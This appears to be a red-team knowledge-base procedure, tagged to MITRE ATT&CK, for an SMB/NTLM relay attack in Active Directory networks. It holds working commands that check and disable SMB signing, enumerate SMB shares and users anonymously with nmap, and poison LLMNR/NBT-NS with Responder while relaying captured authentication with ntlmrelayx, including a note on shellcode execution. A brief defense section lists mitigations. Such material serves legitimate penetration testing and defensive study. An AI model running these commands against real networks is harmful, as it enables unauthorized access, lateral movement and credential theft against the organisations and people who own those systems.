---
id: 91166105-7aa7-4e3c-a0e2-6d5fcab3044e
name: SMB-Relay-Attack-via-Disabled-SMB-Signing
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:05.372255+00:00'
updated_at: '2023-04-10T20:26:21.811002+00:00'
tactics:
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - >-
    [[techniques/Adversary-in-the-Middle|T1557.001 - Adversary-in-the-Middle:
    LLMNR/NBT-NS Poisoning and SMB Relay]]
sub_techniques: []
tags:
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/Man-in-the-Middle attacks & relaying]]'
  - '[[tags/SMB Signing Disabled and IPv4]]'
  - smb-relay
  - ntlm-relay
commands:
  - '[[commands/powershell-check-smb-signing-enabled]]'
  - '[[commands/powershell-disable-smb-signing-client]]'
  - '[[commands/nmap-enumerate-smb-targets]]'
  - '[[commands/impacket-ntlmrelayx-smb-relay]]'
platforms:
  - Windows
tools:
  - '[[tools/Nmap]]'
  - '[[tools/Impacket]]'
  - '[[tools/Responder]]'
validated: true
---

# SMB-Relay-Attack-via-Disabled-SMB-Signing

## Summary

This procedure outlines how to perform an SMB relay attack by exploiting environments where SMB signing is disabled on client and server sides. It involves checking and disabling SMB signing if necessary, enumerating vulnerable SMB targets, setting up a rogue authentication server, and relaying captured NTLM authentication to gain unauthorized access to remote systems and resources.

## Description

SMB relay attacks are a form of man-in-the-middle (MitM) exploitation targeting the Server Message Block (SMB) protocol, specifically NTLM authentication. When SMB signing is disabled (RequireSecuritySignature=0 on both LanmanWorkstation for clients and LanmanServer for servers), an attacker can intercept authentication attempts (often triggered via LLMNR/NBT-NS poisoning) and relay them to other systems without detection. This allows access to admin shares, remote execution, or credential dumping on targets that accept the relayed credentials. The attack assumes IPv4 usage and is effective in Active Directory environments with weak segmentation. Success leads to lateral movement, such as accessing C$ shares or executing commands via relayed sessions. This procedure uses tools like Responder for poisoning and Impacket's ntlmrelayx for relaying.

## Requirements

1. Attacker machine on the same network segment as victims and targets (Layer 2 access for poisoning).
2. Administrative privileges on the attacker's Windows machine to modify registry for signing (if testing locally) or tools like Responder on Linux/Kali.
3. Tools installed: Nmap for enumeration, Responder or Inveigh for poisoning, Impacket for relaying.
4. Targets with SMB signing disabled (clients must not require signing to auth to rogue server; servers must not require signing to accept relayed auth).
5. IPv4 enabled; no IPsec or network segmentation blocking SMB (ports 139/445).

## Defense

- Enable SMB signing globally via Group Policy (RequireSecuritySignature=1 on both client and server sides).
- Disable LLMNR and NBT-NS; enforce DNS for name resolution.
- Use SMBv3 with encryption and signing enforced.
- Monitor for anomalous SMB traffic, such as connections to rogue IPs or unusual auth patterns via Sysmon or network IDS (e.g., Suricata rules for NTLM relay).
- Implement EPA (Extended Protection for Authentication) and restrict NTLM usage.

## Objectives

1. Verify and ensure SMB signing is disabled to enable relaying.
2. Identify vulnerable SMB targets via enumeration.
3. Capture and relay NTLM auth to gain access to remote resources.
4. Achieve lateral movement, such as shell access or credential theft.

## Instructions

### Step 1: Check SMB Signing Status

**Context**: Before attempting the relay, verify if SMB signing is required on client (LanmanWorkstation) and server (LanmanServer) sides. This step uses PowerShell to query configurations. If signing is required, proceed to disable it (note: disabling requires admin rights and may trigger alerts in monitored environments).

**Command** ([[commands/powershell-check-smb-signing-enabled]]):
```powershell
Get-SmbServerConfiguration | Select-Object EnableSecuritySignature, RequireSecuritySignature
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" -Name RequireSecuritySignature
```

> This command checks server-side signing requirements and client-side registry. Run on a test machine or remotely if possible. If RequireSecuritySignature is 1 on either, the relay may fail due to signature mismatches.

### Step 2: Disable SMB Signing if Enabled

**Context**: Disable signing on the client side to allow authentication to the rogue server without signatures. For server-side targets, this may need to be done remotely or assumed vulnerable. Use registry modification via PowerShell; reboot or restart services may be required for changes to take effect.

**Command** ([[commands/powershell-disable-smb-signing-client]]):
```powershell
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" -Name RequireSecuritySignature -Value 0
Restart-Service LanmanWorkstation -Force
```

> This disables client-side SMB signing. For server-side, use Set-SmbServerConfiguration -RequireSecuritySignature $false. Verify with Step 1 command post-change. Warning: This weakens security; use only in controlled environments.

### Step 3: Enumerate SMB Targets

**Context**: Scan the network for hosts with open SMB ports (139/445) and enumerate shares/users anonymously to identify relay targets. Use Nmap with SMB scripts to find systems likely vulnerable to relay (e.g., those allowing Guest/Null auth).

**Command** ([[commands/nmap-enumerate-smb-targets]]):
```bash
nmap -p 139,445 --script smb-enum-shares.nse,smb-enum-users.nse --script-args smbuser='Guest',smbpass='' -oN smb-targets.txt 192.168.0.0/24
```

> This performs anonymous SMB enumeration. Look for hosts with accessible shares like IPC$, ADMIN$, or users listed. Save output to targets.txt for relaying. If no anonymous access, use known creds.

### Step 4: Perform SMB Relay Attack

**Context**: Set up LLMNR/NBT-NS poisoning with Responder to capture auth attempts, then relay them using Impacket's ntlmrelayx to the enumerated targets. This step assumes poisoning is active; victims will auth to attacker's IP when resolving names.

**Command** ([[commands/impacket-ntlmrelayx-smb-relay]]):
```bash
python3 ntlmrelayx.py -tf smb-targets.txt -smb2support --no-http-server
```

> Run this after starting Responder (responder -I eth0 -wrd). Captured NTLMv2 hashes/challenges are relayed to targets in targets.txt. Options enable SMB2 and disable HTTP to focus on SMB. If successful, gain access to shares or execute commands (add -e for shellcode execution).
